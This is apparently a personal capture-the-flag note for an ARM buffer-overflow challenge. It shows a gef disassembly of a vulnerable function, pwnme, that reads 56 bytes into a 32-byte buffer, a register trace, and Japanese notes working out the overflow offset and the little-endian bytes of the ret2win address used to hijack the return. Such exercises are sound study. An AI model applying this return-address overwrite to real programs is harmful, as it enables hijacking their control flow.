````
gef➤  disas
Dump of assembler code for function pwnme:
   0x00010570 <+0>:    push    {r11, lr}
     <+4>:    add    r11, sp, #4
   0x00010578 <+8>:    sub    sp, sp, #32
   0x0001057c <+12>:    sub    r3, r11, #36    ; 0x24
   0x00010580 <+16>:    mov    r2, #32
   0x00010584 <+20>:    mov    r1, #0
   0x00010588 <+24>:    mov    r0, r3
   0x0001058c <+28>:    bl    0x10410 <memset@plt>
   0x00010590 <+32>:    ldr    r0, [pc, #64]    ; 0x105d8 <pwnme+104>
   0x00010594 <+36>:    bl    0x103d4 <puts@plt>
   0x00010598 <+40>:    ldr    r0, [pc, #60]    ; 0x105dc <pwnme+108>
   0x0001059c <+44>:    bl    0x103d4 <puts@plt>
   0x000105a0 <+48>:    ldr    r0, [pc, #56]    ; 0x105e0 <pwnme+112>
   0x000105a4 <+52>:    bl    0x103d4 <puts@plt>
   0x000105a8 <+56>:    ldr    r0, [pc, #52]    ; 0x105e4 <pwnme+116>
   0x000105ac <+60>:    bl    0x103bc <printf@plt>
   0x000105b0 <+64>:    sub    r3, r11, #36    ; 0x24
   0x000105b4 <+68>:    mov    r2, #56    ; 0x38
   0x000105b8 <+72>:    mov    r1, r3
   0x000105bc <+76>:    mov    r0, #0
=> 0x000105c0 <+80>:    bl    0x103c8 <read@plt>
   0x000105c4 <+84>:    ldr    r0, [pc, #28]    ; 0x105e8 <pwnme+120>
   0x000105c8 <+88>:    bl    0x103d4 <puts@plt>
   0x000105cc <+92>:    nop            ; (mov r0, r0)
   0x000105d0 <+96>:    sub    sp, r11, #4
   0x000105d4 <+100>:    pop    {r11, pc}
   0x000105d8 <+104>:            ; <UNDEFINED> instruction: 0x000106b0
   0x000105dc <+108>:    andeq    r0, r1, r0, lsl r7
   0x000105e0 <+112>:    andeq    r0, r1, r0, lsr r7
   0x000105e4 <+116>:    muleq    r1, r0, r7
   0x000105e8 <+120>:    muleq    r1, r4, r7
End of assembler dump.
````



```

push {r11,lr}
sp = 0xbefff4b8
fp = 0xbefff4dc
ret = 0xbefff4d8
r11 = sp + 4
sp = sp - 32
r3 = r11 - 36
r1 = r3
r0 = read(r0,0xbefff4b8,56) // read(fd,*buf,count)
```

ret2winのアドレスが000105ec

リトルエンディアンなので\xec\x05\x01\x00

0xbefff4d8 - 0xbefff4b8

